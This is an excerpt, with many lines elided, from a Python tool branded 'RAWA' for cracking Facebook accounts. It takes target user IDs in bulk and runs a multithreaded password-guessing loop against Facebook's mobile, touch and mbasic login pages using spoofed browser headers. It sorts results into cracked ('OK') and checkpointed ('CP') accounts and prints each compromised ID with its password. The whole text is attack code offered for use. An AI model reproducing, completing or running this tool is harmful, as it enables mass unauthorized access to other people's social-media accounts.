...
\x1b[92;1mTHIS TOOL CRATE BY RAWA

{M}>{K}>{H}> {P}CRAKING FACEBOOK {H}>{K}>{M}>
''')
def MRBX():
	try:
...
def menu(my_name,my_id):
	...
	banner()
	print('')
	print(' \033[1;97m[\033[1;32m01\033[1;97m] CRACK ID PULEC👽')
	print('')
	print(' \033[1;97m[\033[1;32m02\033[1;97m] CRACK FILE👽')
	print('')
	print(' \033[1;97m[\033[1;32m00\033[1;97m] DELETE COOKIE')
	_____alvino__adijaya_____ = input('033[32m ENTR =   ')
	print('')
	if _____alvino__adijaya_____ in ['1']:
		...
		print('\x1b[1;93m[\x1b[1;92m!\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92mPilih Yang Bener ')
		back()
def error():
	...
	print('')
def result():
	print('\x1b[1;93m[\x1b[1;92m1\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92mHasil Akun Checkpoint \33[m(\x1b[1;93mCP\33[m) \x1b[1;92mAnda ')
	print('\x1b[1;93m[\x1b[1;92m2\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;91mHasil Akun OK \33[m(\x1b[1;92mOK\33[m) \x1b[1;91mAnda ')
	...
	if kz in ['1','01']:
		...
		if len(vin)==0:
			...
			for cpku in range(len(lin)):
				...
				print(f'{b}USER AGENT : {x}{cpkuni[2]}')
				nocp +=1
			input('[ Klik Enter ]')
			back()
	elif kz in ['0','00']:
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('\x1b[1;91mCHAN IDET AWET =  '))
	except ValueError:
	...
	for met in range(jum):
		yz+=1
		kl = input('\x1b[1;91mID DANE  '+str(yz)+' = \x1b[1;93m')
		uid.append(kl)
	for userr in uid:
		try:
	...
	try:
		print('')
		print(f'\x1b[1;91mIDS = {h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('\x1b[1;93m[\x1b[1;92m!\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92mSinyal Anda Kurang Bagus Nih !')
...
def setting():
	print('')
	print('\x1b[1;97mKON slow+NEW FB fast = [ \x1b[1;92m1\x1b[1;97m ] ')
	print('')
	hu = input('\x1b[1;32mHALBZHIRA ≛≫ ')
	print('')
	if hu in ['30','030']:
		...
		print('')
		exit()
	print('\x1b[1;97m Mobile.facebook.com =   \x1b[1;97m[\x1b[1;32m01\x1b[1;97m]')	
	print('\x1b[1;97m touch.facebook.com =   \x1b[1;97m[\x1b[1;32m02\x1b[1;97m] ')	
	print('\x1b[1;97m Masb.facebook.com =   \x1b[1;97m[\x1b[1;32m03\x1b[1;97m]')
	print('-------------------------------------------------------------')	
	hc = input('\x1b[1;97m ENTR =  ')
	print('')
	if hc in ['1','01']:
		...
		method.append('mobile')
	print('')
	_jembot_ = input('\033[1;97m[\033[1;32m01\033[1;97m] FAST PRO= ')
	if _jembot_ in ['']:
		print('\033[1;97m[\033[1;32mT\033[1;97m] AUTO PASSWORD ')
		back()
		...
		taplikasi.append('no')
	print('')
	pwplus=input('\x1b[1;97mAUTO PASS [ \x1b[1;32m t/y \x1b[1;97m] = ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crackfree,idf,pwv)
	print('')
	cetak(nel('\t[cyan]-[green] CRACK KOTAY HAT LUNA♣ [cyan] =[white] '))
	print(f'[{h}•{h}]{h} OK : {h}%s '%(ok))
	print(f'{m}[{m}•{m}]{m} CP : {m}%s{m} '%(cp))
	print('')
	print(' AGAIN CRACK Y [ NOT AGREE CRACK T ')
	woi = input('\x1b[1;95m   HALBZHIRA ≛≫ ')
	if woi in ['y','Y']:
		back()
	else:
		print(f'\t{x}{k}  ')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{Z}[RAWA💰]{P} {Z}[{Z}{loop}{Z}/{Z}{len(id)}{Z}]—{Z}[{H}{ok}{Z}]—[{K}{cp}{Z}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{Z}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{M}[RAWA🤮-CP]  {m}{idf} | {m}{pw}') 
...
def cracktouch(idf,pwv):
	...
	for pw in pwv:
		try:
			...
			heade={'Host': 'touch.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://touch.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'none','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','referer': 'https://touch.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					print('\n')
					statuscp = f'[LUNA OK•] ID       : {idf} [•] PASSWORD : {pw}'
